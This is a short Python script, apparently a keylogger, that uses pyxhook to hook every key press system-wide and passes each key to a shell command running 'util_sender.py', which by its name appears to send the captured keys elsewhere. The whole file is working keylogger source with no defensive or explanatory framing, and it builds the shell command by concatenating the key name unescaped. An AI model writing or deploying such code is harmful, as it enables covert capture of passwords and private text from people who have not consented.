import pyxhook
import os

def OnKeyPress(event):
  string = "python util_sender.py " + event.Key
  os.system(string)

new_hook = pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress

new_hook.HookKeyboard()

new_hook.start()
